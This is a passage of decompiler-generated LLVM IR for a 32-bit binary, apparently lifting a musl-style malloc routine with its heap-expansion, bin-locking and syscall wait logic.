  store i32 %v1_804a8c6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a7de

dec_label_pc_804a8d0:                             ; preds = %dec_label_pc_804a7de
  %v0_804a8d4 = load i32, i32* @ebp, align 4
  %v1_804a8d4 = add i32 %v0_804a8d4, 4111
  %v1_804a8da = and i32 %v1_804a8d4, -4096
  store i32 %v1_804a8da, i32* %edx.global-to-local, align 4
  store i32 %v1_804a8da, i32* %stack_var_-76, align 4
  %v1_804a8eb = add i32 %stack_var_-52.0.ph, -16
  %v1_804a8ee = and i32 %v1_804a8eb, -4096
  %v2_804a8f3 = sub i32 %v1_804a8ee, %v1_804a8da
  store i32 %v2_804a8f3, i32* %eax.global-to-local, align 4
  %v3_804a8f9 = call i32 @__madvise(i32 %v1_804a8da, i32 %v2_804a8f3, i32 4)
  store i32 %v3_804a8f9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a817

; uselistorder directives
  uselistorder i32 %v1_804a864, { 1, 0 }
  uselistorder i32 %v1_804a852, { 0, 2, 1 }
  uselistorder i32 %v1_804a77e, { 1, 0 }
  uselistorder i32 %v3_804a770, { 6, 5, 3, 4, 0, 1, 2 }
  uselistorder i32 %v4_804a550.le, { 0, 2, 1 }
  uselistorder i32 %v1_804a757, { 1, 0 }
  uselistorder i32 %v2_804a6cf, { 1, 0, 2 }
  uselistorder i32 %v1_804a6cc, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %stack_var_-40.1, { 1, 0, 2 }
  uselistorder i32 %v2_804a694, { 1, 0, 2 }
  uselistorder i32 %v1_804a691, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_804a5e5, { 1, 0 }
  uselistorder i32 %v1_804a5dc, { 2, 1, 0 }
  uselistorder i32 %v1_804a564, { 7, 6, 3, 2, 1, 0, 5, 4, 8, 9 }
  uselistorder i32 %v2_804a559, { 1, 7, 2, 4, 3, 0, 5, 6 }
  uselistorder i32 %v1_804a51a, { 3, 0, 1, 2, 4 }
  uselistorder i32 %stack_var_-40.0, { 1, 0, 3, 4, 2 }
  uselistorder i32 %stack_var_-48.0, { 2, 1, 5, 3, 0, 4 }
  uselistorder i32* %v3_804a4fc, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0.ph, { 0, 1, 7, 2, 6, 5, 8, 4, 3 }
  uselistorder i32 %v1_804a4d3, { 0, 5, 1, 4, 3, 6, 2 }
  uselistorder i32 %v3_804a4c6, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804a4c3, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-76, { 4, 1, 3, 2, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 0, 14, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 5, 8, 6, 7, 9, 16, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 42, 39, 40, 41, 45, 43, 44, 46, 47, 0, 49, 48, 50, 51, 52, 55, 53, 54, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 ptrtoint (i32* @global_var_8056dc8.339 to i32), { 1, 2, 0, 3 }
  uselistorder i32* @global_var_8056dc8.339, { 4, 5, 6, 7, 3, 8, 9, 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804a817, { 1, 0 }
  uselistorder label %dec_label_pc_804a7de, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a7aa, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_804a77e, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_804a718, { 1, 0 }
  uselistorder label %dec_label_pc_804a710, { 4, 1, 2, 3, 5, 0 }
  uselistorder label %dec_label_pc_804a677, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804a628, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a5e5, { 1, 0 }
  uselistorder label %dec_label_pc_804a5c3, { 1, 0 }
  uselistorder label %dec_label_pc_804a550, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a4f5, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_804a910 = load i32, i32* @ebp, align 4
  %v0_804a911 = load i32, i32* @edi, align 4
  %v0_804a912 = load i32, i32* @esi, align 4
  %v0_804a913 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_804a91b = add i32 %arg1, -1
  store i32 %v1_804a91b, i32* %eax.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804a91b, 2147479536
  br i1 %tmp, label %dec_label_pc_804aba4, label %dec_label_pc_804a929

dec_label_pc_804a929:                             ; preds = %entry
  %v1_804a929 = icmp eq i32 %arg1, 0
  %v1_804a93b = icmp eq i1 %v1_804a929, false
  br i1 %v1_804a93b, label %dec_label_pc_804adca, label %dec_label_pc_804a941

dec_label_pc_804a941:                             ; preds = %dec_label_pc_804abba, %dec_label_pc_804a929, %dec_label_pc_804abcf
  %stack_var_-60.0 = phi i32 [ %v1_804abbf, %dec_label_pc_804abba ], [ %v1_804abe6, %dec_label_pc_804abcf ], [ 0, %dec_label_pc_804a929 ]
  %stack_var_-40.0 = phi i32 [ %v1_804aba7, %dec_label_pc_804abba ], [ %v1_804aba7, %dec_label_pc_804abcf ], [ 16, %dec_label_pc_804a929 ]
  %sext = mul i32 %stack_var_-60.0, 16777216
  %v4_804a941 = sdiv i32 %sext, 16777216
  store i32 %v4_804a941, i32* %ecx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v2_804a950 = urem i32 %v4_804a941, 32
  %v4_804a950 = icmp eq i32 %v2_804a950, 0
  br i1 %v4_804a950, label %bb49, label %bb

bb:                                               ; preds = %dec_label_pc_804a941
  %v5_804a950 = shl i32 -1, %v2_804a950
  store i32 %v5_804a950, i32* %eax.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_804a941, %bb
  %v0_804abf4 = phi i32 [ -1, %dec_label_pc_804a941 ], [ %v5_804a950, %bb ]
  %v2_804a952 = and i32 %v4_804a941, 32
  %v3_804a952 = icmp eq i32 %v2_804a952, 0
  %v1_804a955 = icmp eq i1 %v3_804a952, false
  br i1 %v1_804a955, label %dec_label_pc_804abf4, label %dec_label_pc_804a95b

dec_label_pc_804a95b:                             ; preds = %bb49, %dec_label_pc_804abf4
  %v0_804a95b = phi i32 [ %v0_804abf4, %bb49 ], [ 0, %dec_label_pc_804abf4 ]
  %v0_804a95f = phi i32 [ -1, %bb49 ], [ %v0_804abf4, %dec_label_pc_804abf4 ]
  br label %dec_label_pc_804a963

dec_label_pc_804a963:                             ; preds = %dec_label_pc_804aa47, %dec_label_pc_804aa2c, %dec_label_pc_804aa13, %dec_label_pc_804aa68, %dec_label_pc_804a95b
  %v0_804a963 = load i32, i32* @global_var_80569c0.334, align 64
  store i32 %v0_804a963, i32* %eax.global-to-local, align 4
  %v0_804a96c = load i32, i32* @global_var_80569c4.335, align 4
  %v2_804a976 = and i32 %v0_804a96c, %v0_804a95f
  %v3_804a976 = icmp eq i32 %v2_804a976, 0
  store i32 %v2_804a976, i32* @ebx, align 4
  %v2_804a978 = and i32 %v0_804a963, %v0_804a95b
  %v3_804a978 = icmp eq i32 %v2_804a978, 0
  store i32 %v2_804a978, i32* %ecx.global-to-local, align 4
  %v2_804a97c = or i32 %v2_804a976, %v2_804a978
  %v3_804a97c = icmp eq i32 %v2_804a97c, 0
  store i32 %v2_804a97c, i32* %edx.global-to-local, align 4
  br i1 %v3_804a97c, label %dec_label_pc_804aa8a, label %dec_label_pc_804a984

dec_label_pc_804a984:                             ; preds = %dec_label_pc_804a963
  store i32 %v2_804a976, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804a98c = load i32, i32* @ebp, align 4
  %v2_804a98c = call i32 @llvm.cttz.i32(i32 %v2_804a978, i1 true)
  %v4_804a98c = select i1 %v3_804a978, i32 %v0_804a98c, i32 %v2_804a98c
  %v1_804a98f = icmp eq i1 %v3_804a978, false
  br i1 %v1_804a98f, label %dec_label_pc_804a997, label %dec_label_pc_804a991

dec_label_pc_804a991:                             ; preds = %dec_label_pc_804a984
  %v2_804a991 = call i32 @llvm.cttz.i32(i32 %v2_804a976, i1 true)
  %v4_804a991 = select i1 %v3_804a976, i32 %v4_804a98c, i32 %v2_804a991
  %v1_804a994 = add i32 %v4_804a991, 32
  br label %dec_label_pc_804a997

dec_label_pc_804a997:                             ; preds = %dec_label_pc_804a984, %dec_label_pc_804a991
  %storemerge = phi i32 [ %v1_804a994, %dec_label_pc_804a991 ], [ %v4_804a98c, %dec_label_pc_804a984 ]
  %v0_804a99c = phi i32 [ %v1_804a994, %dec_label_pc_804a991 ], [ %v2_804a98c, %dec_label_pc_804a984 ]
  store i32 %storemerge, i32* @ebp, align 4
  %v0_804a997 = load i32, i32* @global_var_8056f8c.333, align 4
  store i32 %v0_804a997, i32* %eax.global-to-local, align 4
  %v2_804a99e = mul i32 %v0_804a99c, 16
  store i32 %v2_804a99e, i32* %edx.global-to-local, align 4
  %v1_804a9a1 = add i32 %v2_804a99e, 134572480
  store i32 %v1_804a9a1, i32* %ecx.global-to-local, align 4
  %v1_804a9a7 = add i32 %v2_804a99e, 134572488
  store i32 %v1_804a9a7, i32* @edi, align 4
  %v1_804a9aa = icmp eq i32 %v0_804a997, 0
  br i1 %v1_804a9aa, label %dec_label_pc_804a9f0, label %dec_label_pc_804a9ae

dec_label_pc_804a9ae:                             ; preds = %dec_label_pc_804a997
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804a9b3 = inttoptr i32 %v1_804a9a7 to i32*
  %v3_804a9b3 = load i32, i32* %v2_804a9b3, align 8
  store i32 1, i32* %v2_804a9b3, align 8
  store i32 %v3_804a9b3, i32* %eax.global-to-local, align 4
  %v1_804a9b6 = icmp eq i32 %v3_804a9b3, 0
  br i1 %v1_804a9b6, label %dec_label_pc_804a9f0, label %dec_label_pc_804a9ba

dec_label_pc_804a9ba:                             ; preds = %dec_label_pc_804a9ae
  %v0_804a9ba = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804a9ba, i32* @ebx, align 4
  %v1_804a9bc = add i32 %v0_804a9ba, 134572492
  store i32 %v1_804a9bc, i32* @esi, align 4
  br label %dec_label_pc_804a9c2

dec_label_pc_804a9c2:                             ; preds = %dec_label_pc_804a9c2.dec_label_pc_804a9c2_crit_edge, %dec_label_pc_804a9ba
  %v0_804a9d2 = phi i32 [ %v0_804a9d2.pre, %dec_label_pc_804a9c2.dec_label_pc_804a9c2_crit_edge ], [ %v1_804a9bc, %dec_label_pc_804a9ba ]
  %v0_804a9d6 = load i32, i32* @edi, align 4
  store i32 %v0_804a9d6, i32* %stack_var_-108, align 4
  %v4_804a9d9 = inttoptr i32 %v0_804a9d6 to i32*
  %v5_804a9d9 = call i32 @__wait(i32* %v4_804a9d9, i32 %v0_804a9d2, i32 1)
  %v0_804a9de = load i32, i32* @ebx, align 4
  %v1_804a9de = add i32 %v0_804a9de, 134572480
  store i32 %v1_804a9de, i32* %edx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804a9e9 = add i32 %v0_804a9de, 134572488
  %v2_804a9e9 = inttoptr i32 %v1_804a9e9 to i32*
  %v3_804a9e9 = load i32, i32* %v2_804a9e9, align 4
  store i32 1, i32* %v2_804a9e9, align 4
  store i32 %v3_804a9e9, i32* %eax.global-to-local, align 4
  %v1_804a9ec = icmp eq i32 %v3_804a9e9, 0
  %v1_804a9ee = icmp eq i1 %v1_804a9ec, false
  br i1 %v1_804a9ee, label %dec_label_pc_804a9c2.dec_label_pc_804a9c2_crit_edge, label %dec_label_pc_804a9f0

dec_label_pc_804a9c2.dec_label_pc_804a9c2_crit_edge: ; preds = %dec_label_pc_804a9c2
  %v0_804a9d2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a9c2

dec_label_pc_804a9f0:                             ; preds = %dec_label_pc_804a9c2, %dec_label_pc_804a9ae, %dec_label_pc_804a997
  %v0_804a9f0 = load i32, i32* @ebp, align 4
  %v2_804a9f2 = mul i32 %v0_804a9f0, 16
  store i32 %v2_804a9f2, i32* %edx.global-to-local, align 4
  %v1_804a9f5 = add i32 %v2_804a9f2, 134572496
  %v2_804a9f5 = inttoptr i32 %v1_804a9f5 to i32*
  %v3_804a9f5 = load i32, i32* %v2_804a9f5, align 16
  store i32 %v3_804a9f5, i32* @edi, align 4
  %v1_804a9fb = icmp eq i32 %v3_804a9f5, 0
  %v1_804aa76 = add i32 %v2_804a9f2, 134572488
  store i32 %v1_804aa76, i32* %eax.global-to-local, align 4
  br i1 %v1_804a9fb, label %dec_label_pc_804aa76, label %dec_label_pc_804aa03

dec_label_pc_804aa03:                             ; preds = %dec_label_pc_804a9f0
  %v15_804aa09 = icmp eq i32 %v3_804a9f5, %v1_804aa76
  %v1_804aa0d = icmp eq i1 %v15_804aa09, false
  br i1 %v1_804aa0d, label %dec_label_pc_804abfd, label %dec_label_pc_804aa13

dec_label_pc_804aa13:                             ; preds = %dec_label_pc_804aa03, %dec_label_pc_804aa76
  %v0_804aa13 = phi i32 [ %v0_804a9f0, %dec_label_pc_804aa03 ], [ %v0_804aa13.pre, %dec_label_pc_804aa76 ]
  %v2_804aa15 = mul i32 %v0_804aa13, 16
  store i32 %v2_804aa15, i32* %edx.global-to-local, align 4
  %v1_804aa18 = add i32 %v2_804aa15, 134572480
  store i32 %v1_804aa18, i32* %ecx.global-to-local, align 4
  %v1_804aa1e = add i32 %v2_804aa15, 134572488
  %v2_804aa1e = inttoptr i32 %v1_804aa1e to i32*
  %v3_804aa1e = load i32, i32* %v2_804aa1e, align 8
  store i32 %v3_804aa1e, i32* %eax.global-to-local, align 4
  store i32 %v1_804aa1e, i32* @ebx, align 4
  %v1_804aa24 = icmp eq i32 %v3_804aa1e, 0
  br i1 %v1_804aa24, label %dec_label_pc_804a963, label %dec_label_pc_804aa2c

dec_label_pc_804aa2c:                             ; preds = %dec_label_pc_804aa13
  store i32 0, i32* %v2_804aa1e, align 8
  %v2_804aa31 = load i32, i32* %stack_var_-108, align 4
  %v0_804aa36 = load i32, i32* %edx.global-to-local, align 4
  %v1_804aa36 = add i32 %v0_804aa36, 134572484
  store i32 %v1_804aa36, i32* %eax.global-to-local, align 4
  %v1_804aa3c = add i32 %v0_804aa36, 134572492
  %v2_804aa3c = inttoptr i32 %v1_804aa3c to i32*
  %v3_804aa3c = load i32, i32* %v2_804aa3c, align 4
  store i32 %v3_804aa3c, i32* %eax.global-to-local, align 4
  %v1_804aa3f = icmp eq i32 %v3_804aa3c, 0
  br i1 %v1_804aa3f, label %dec_label_pc_804a963, label %dec_label_pc_804aa47

dec_label_pc_804aa47:                             ; preds = %dec_label_pc_804aa2c
  store i32 240, i32* @esi, align 4
  store i32 129, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  %v0_804aa58 = load i32, i32* @ebx, align 4
  store i32 %v0_804aa58, i32* @edx, align 4
  %v1_804aa5a = call i32 @__vsyscall(i32 %v2_804aa31)
  store i32 %v1_804aa5a, i32* %eax.global-to-local, align 4
  %v10_804aa5f = icmp eq i32 %v1_804aa5a, -38
  %v1_804aa62 = icmp eq i1 %v10_804aa5f, false
  br i1 %v1_804aa62, label %dec_label_pc_804a963, label %dec_label_pc_804aa68

dec_label_pc_804aa68:                             ; preds = %dec_label_pc_804aa47
  %v0_804aa68 = load i32, i32* @esi, align 4
  store i32 %v0_804aa68, i32* @eax, align 4
  %v0_804aa6a = load i32, i32* @edi, align 4
  store i32 %v0_804aa6a, i32* %ecx.global-to-local, align 4
  %v0_804aa6c = load i32, i32* %stack_var_-108, align 4
  %v1_804aa6c = call i32 @__vsyscall(i32 %v0_804aa6c)
  store i32 %v1_804aa6c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a963

dec_label_pc_804aa76:                             ; preds = %dec_label_pc_804a9f0
  %v2_804aa7c = add i32 %v2_804a9f2, 134572500
  %v3_804aa7c = inttoptr i32 %v2_804aa7c to i32*
  store i32 %v1_804aa76, i32* %v3_804aa7c, align 4
  %v0_804aa82 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa82 = load i32, i32* %edx.global-to-local, align 4
  %v2_804aa82 = add i32 %v1_804aa82, 134572496
  %v3_804aa82 = inttoptr i32 %v2_804aa82 to i32*
  store i32 %v0_804aa82, i32* %v3_804aa82, align 4
  %v0_804aa13.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804aa13

dec_label_pc_804aa8a:                             ; preds = %dec_label_pc_804a963
  store i32 ptrtoint (i32* @global_var_80569a4.341 to i32), i32* @ebp, align 4
  %v1_804aa93 = add i32 %stack_var_-40.0, 16
  store i32 %v1_804aa93, i32* %stack_var_-28, align 4
  %v0_804aa9a = load i32, i32* @global_var_8056f8c.333, align 4
  store i32 %v0_804aa9a, i32* %eax.global-to-local, align 4
  %v1_804aa9f = icmp eq i32 %v0_804aa9a, 0
  %v1_804aaa1 = icmp eq i1 %v1_804aa9f, false
  br i1 %v1_804aaa1, label %dec_label_pc_804ab90.preheader, label %dec_label_pc_804aaa7

dec_label_pc_804ab90.preheader:                   ; preds = %dec_label_pc_804aa8a
  %v0_804ab9555 = load i32, i32* @global_var_80569a4.341, align 4
  store i32 1, i32* @global_var_80569a4.341, align 4
  store i32 %v0_804ab9555, i32* %eax.global-to-local, align 4
  %v1_804ab9b56 = icmp eq i32 %v0_804ab9555, 0
  %v1_804ab9d58 = icmp eq i1 %v1_804ab9b56, false
  br i1 %v1_804ab9d58, label %dec_label_pc_804ab6c, label %dec_label_pc_804aaa7

dec_label_pc_804aaa7:                             ; preds = %dec_label_pc_804ab90.preheader, %dec_label_pc_804ab6c, %dec_label_pc_804aa8a
  %v2_804aaa7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aaa7, i32* %eax.global-to-local, align 4
  store i32 %v2_804aaa7, i32* %stack_var_-108, align 4
  %v2_804aaae = call i32 @__expand_heap(i32* nonnull %stack_var_-28)
  store i32 %v2_804aaae, i32* %eax.global-to-local, align 4
  %v1_804aab3 = icmp eq i32 %v2_804aaae, 0
  store i32 %v2_804aaae, i32* @ecx, align 4
  br i1 %v1_804aab3, label %dec_label_pc_804ad7c, label %dec_label_pc_804aabd

dec_label_pc_804aabd:                             ; preds = %dec_label_pc_804aaa7
  %v1_804aabd = load i32, i32* @global_var_80569a0.342, align 32
  %v12_804aabd = icmp eq i32 %v2_804aaae, %v1_804aabd
  br i1 %v12_804aabd, label %dec_label_pc_804aad4, label %dec_label_pc_804aac5

dec_label_pc_804aac5:                             ; preds = %dec_label_pc_804aabd
  %v1_804aac5 = add i32 %v2_804aaae, 16
  store i32 %v1_804aac5, i32* @ecx, align 4
  %v3_804aac8 = load i32, i32* %stack_var_-28, align 4
  %v4_804aac8 = add i32 %v3_804aac8, -16
  store i32 %v4_804aac8, i32* %stack_var_-28, align 4
  %v1_804aacd = add i32 %v2_804aaae, 8
  %v2_804aacd = inttoptr i32 %v1_804aacd to i32*
  store i32 1, i32* %v2_804aacd, align 4
  %v0_804aad8.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804aad4

dec_label_pc_804aad4:                             ; preds = %dec_label_pc_804aabd, %dec_label_pc_804aac5
  %v0_804aad8 = phi i32 [ %v2_804aaae, %dec_label_pc_804aabd ], [ %v0_804aad8.pre, %dec_label_pc_804aac5 ]
  %v3_804aad4 = load i32, i32* %stack_var_-28, align 4
  %v1_804aad8 = add i32 %v0_804aad8, -8
  store i32 %v1_804aad8, i32* @ebx, align 4
  %v2_804aadf = add i32 %v3_804aad4, %v0_804aad8
  store i32 %v2_804aadf, i32* @edx, align 4
  %v1_804aae2 = or i32 %v3_804aad4, 1
  store i32 %v1_804aae2, i32* %eax.global-to-local, align 4
  %v1_804aae5 = add i32 %v2_804aadf, -4
  %v2_804aae5 = inttoptr i32 %v1_804aae5 to i32*
  store i32 1, i32* %v2_804aae5, align 4
  %v0_804aaec = load i32, i32* %eax.global-to-local, align 4
  %v1_804aaec = load i32, i32* @edx, align 4
  %v2_804aaec = add i32 %v1_804aaec, -8
  %v3_804aaec = inttoptr i32 %v2_804aaec to i32*
  store i32 %v0_804aaec, i32* %v3_804aaec, align 4
  %v0_804aaef = load i32, i32* %eax.global-to-local, align 4
  %v1_804aaef = load i32, i32* @ebx, align 4
  %v2_804aaef = add i32 %v1_804aaef, 4
  %v3_804aaef = inttoptr i32 %v2_804aaef to i32*
  store i32 %v0_804aaef, i32* %v3_804aaef, align 4
  %v0_804aaf2 = load i32, i32* @global_var_80569a4.341, align 4
  store i32 %v0_804aaf2, i32* %eax.global-to-local, align 4
  %v0_804aaf7 = load i32, i32* @edx, align 4
  store i32 %v0_804aaf7, i32* @global_var_80569a0.342, align 32
  %v1_804aafd = icmp eq i32 %v0_804aaf2, 0
  br i1 %v1_804aafd, label %dec_label_pc_804ab1a, label %dec_label_pc_804ab01

dec_label_pc_804ab01:                             ; preds = %dec_label_pc_804aad4
  store i32 0, i32* @global_var_80569a4.341, align 4
  %v2_804ab08 = load i32, i32* %stack_var_-108, align 4
  %v0_804ab0d = load i32, i32* @global_var_80569a8.343, align 8
  store i32 %v0_804ab0d, i32* %eax.global-to-local, align 4
  %v1_804ab12 = icmp eq i32 %v0_804ab0d, 0
  %v1_804ab14 = icmp eq i1 %v1_804ab12, false
  br i1 %v1_804ab14, label %dec_label_pc_804ad1f, label %dec_label_pc_804ab1a

dec_label_pc_804ab1a:                             ; preds = %dec_label_pc_804ad1f, %dec_label_pc_804ab01, %dec_label_pc_804aad4, %dec_label_pc_804ad40
  %v0_804ab1a = load i32, i32* @ebx, align 4
  store i32 %v0_804ab1a, i32* @eax, align 4
  store i32 %v0_804ab1a, i32* @esi, align 4
  %v0_804ab1e = call i32 @alloc_rev()
  store i32 %v0_804ab1e, i32* %eax.global-to-local, align 4
  %v1_804ab23 = icmp eq i32 %v0_804ab1e, 0
  br i1 %v1_804ab23, label %dec_label_pc_804ab4a, label %dec_label_pc_804ab27

dec_label_pc_804ab27:                             ; preds = %dec_label_pc_804ab1a
  %v0_804ab27 = load i32, i32* @ebx, align 4
  %v1_804ab27 = inttoptr i32 %v0_804ab27 to i32*
  %v2_804ab27 = load i32, i32* %v1_804ab27, align 4
  store i32 %v2_804ab27, i32* %eax.global-to-local, align 4
  store i32 %v0_804ab27, i32* %ecx.global-to-local, align 4
  %v1_804ab2b = add i32 %v0_804ab27, 4
  %v2_804ab2b = inttoptr i32 %v1_804ab2b to i32*
  %v3_804ab2b = load i32, i32* %v2_804ab2b, align 4
  store i32 %v3_804ab2b, i32* %edx.global-to-local, align 4
  %v1_804ab2e = and i32 %v2_804ab27, -2
  store i32 %v1_804ab2e, i32* %eax.global-to-local, align 4
  %v2_804ab31 = sub i32 %v0_804ab27, %v1_804ab2e
  store i32 %v2_804ab31, i32* @ecx, align 4
  %v1_804ab33 = add i32 %v2_804ab31, 4
  %v2_804ab33 = inttoptr i32 %v1_804ab33 to i32*
  %v3_804ab33 = load i32, i32* %v2_804ab33, align 4
  store i32 %v2_804ab31, i32* @esi, align 4
  %v1_804ab3c = and i32 %v3_804ab33, -2
  %v2_804ab3f = add i32 %v1_804ab3c, %v3_804ab2b
  store i32 %v2_804ab3f, i32* %eax.global-to-local, align 4
  %v1_804ab41 = and i32 %v3_804ab2b, -2
  store i32 %v1_804ab41, i32* @edx, align 4
  store i32 %v2_804ab3f, i32* %v2_804ab33, align 4
  %v0_804ab47 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab47 = load i32, i32* @ebx, align 4
  %v2_804ab47 = load i32, i32* @edx, align 4
  %v3_804ab47 = add i32 %v2_804ab47, %v1_804ab47
  %v4_804ab47 = inttoptr i32 %v3_804ab47 to i32*
  store i32 %v0_804ab47, i32* %v4_804ab47, align 4
  br label %dec_label_pc_804ab4a

dec_label_pc_804ab4a:                             ; preds = %dec_label_pc_804acc0, %dec_label_pc_804aca5, %dec_label_pc_804ac8c, %dec_label_pc_804ab1a, %dec_label_pc_804ace1, %dec_label_pc_804ab27
  %stack_var_-64.0 = phi i32 [ %v1_804aad8, %dec_label_pc_804ab1a ], [ %v2_804ab31, %dec_label_pc_804ab27 ], [ %v3_804a9f5, %dec_label_pc_804ac8c ], [ %v3_804a9f5, %dec_label_pc_804aca5 ], [ %v3_804a9f5, %dec_label_pc_804acc0 ], [ %v3_804a9f5, %dec_label_pc_804ace1 ]
  store i32 %stack_var_-64.0, i32* @edi, align 4
  %v1_804ab4e = add i32 %stack_var_-64.0, 4
  %v2_804ab4e = inttoptr i32 %v1_804ab4e to i32*
  %v3_804ab4e = load i32, i32* %v2_804ab4e, align 4
  %v1_804ab51 = and i32 %v3_804ab4e, -2
  store i32 %v1_804ab51, i32* @ebx, align 4
  %v1_804ab54 = add i32 %v1_804ab51, -16
  store i32 %v1_804ab54, i32* %eax.global-to-local, align 4
  %v10_804ab57 = icmp ult i32 %stack_var_-40.0, %v1_804ab54
  br i1 %v10_804ab57, label %dec_label_pc_804acef, label %dec_label_pc_804ab61

dec_label_pc_804ab61:                             ; preds = %dec_label_pc_804ab4a, %dec_label_pc_804acef
  %v0_804ab61 = load i32, i32* @esi, align 4
  %v1_804ab61 = add i32 %v0_804ab61, 8
  store i32 %v1_804ab61, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ab64

dec_label_pc_804ab64:                             ; preds = %dec_label_pc_804aeb3, %dec_label_pc_804ae2d, %dec_label_pc_804adca, %dec_label_pc_804ab61
  %v0_804ab6b = phi i32 [ 0, %dec_label_pc_804aeb3 ], [ %v0_804ab6b.pre, %dec_label_pc_804ae2d ], [ 0, %dec_label_pc_804adca ], [ %v1_804ab61, %dec_label_pc_804ab61 ]
  store i32 %v0_804a913, i32* @ebx, align 4
  store i32 %v0_804a912, i32* @esi, align 4
  store i32 %v0_804a911, i32* @edi, align 4
  store i32 %v0_804a910, i32* @ebp, align 4
  ret i32 %v0_804ab6b

dec_label_pc_804ab6c:                             ; preds = %dec_label_pc_804ab90.preheader, %dec_label_pc_804ab6c
  store i32 ptrtoint (i32* @global_var_80569a4.341 to i32), i32* %stack_var_-108, align 4
  %v5_804ab8b = call i32 @__wait(i32* nonnull @global_var_80569a4.341, i32 ptrtoint (i32* @global_var_80569a8.343 to i32), i32 1)
  %v0_804ab95 = load i32, i32* @global_var_80569a4.341, align 4
  store i32 1, i32* @global_var_80569a4.341, align 4
  store i32 %v0_804ab95, i32* %eax.global-to-local, align 4
  %v1_804ab9b = icmp eq i32 %v0_804ab95, 0
  %v1_804ab9d = icmp eq i1 %v1_804ab9b, false
  br i1 %v1_804ab9d, label %dec_label_pc_804ab6c, label %dec_label_pc_804aaa7

dec_label_pc_804aba4:                             ; preds = %entry
  %v1_804aba4 = add i32 %arg1, 23
  %v1_804aba7 = and i32 %v1_804aba4, -16
  store i32 %v1_804aba7, i32* %edx.global-to-local, align 4
  %v6_804abb4 = icmp ugt i32 %v1_804aba7, 114688
  br i1 %v6_804abb4, label %dec_label_pc_804addc, label %dec_label_pc_804abba

dec_label_pc_804abba:                             ; preds = %dec_label_pc_804aba4
  %v2_804abbc = udiv i32 %v1_804aba4, 16
  %v1_804abbf = add nsw i32 %v2_804abbc, -1
  store i32 %v1_804abbf, i32* %eax.global-to-local, align 4
  %tmp59 = icmp ult i32 %v1_804abbf, 33
  br i1 %tmp59, label %dec_label_pc_804a941, label %dec_label_pc_804abcf

dec_label_pc_804abcf:                             ; preds = %dec_label_pc_804abba
  %tmp62 = sitofp i32 %v1_804abbf to float
  %v4_804abda = bitcast float %tmp62 to i32
  %v1_804abde = add i32 %v4_804abda, 2097151
  %v2_804abe3 = udiv i32 %v1_804abde, 2097152
  %v1_804abe6 = add nsw i32 %v2_804abe3, -496
  store i32 %v1_804abe6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a941

dec_label_pc_804abf4:                             ; preds = %bb49
  store i32 %v0_804abf4, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a95b

dec_label_pc_804abfd:                             ; preds = %dec_label_pc_804aa03
  %v1_804abfd = add i32 %v0_804a9f0, -39
  %v6_804abfd = sub i32 38, %v0_804a9f0
  %v7_804abfd = and i32 %v6_804abfd, %v0_804a9f0
  %v8_804abfd = icmp slt i32 %v7_804abfd, 0
  %v9_804abfd = icmp eq i32 %v1_804abfd, 0
  %v10_804abfd = icmp slt i32 %v1_804abfd, 0
  %v3_804ac00 = icmp ne i1 %v10_804abfd, %v8_804abfd
  %v4_804ac00 = or i1 %v9_804abfd, %v3_804ac00
  br i1 %v4_804ac00, label %dec_label_pc_804ac5e, label %dec_label_pc_804ac02

dec_label_pc_804ac02:                             ; preds = %dec_label_pc_804abfd
  %v1_804ac06 = add nsw i32 %v4_804a941, 3
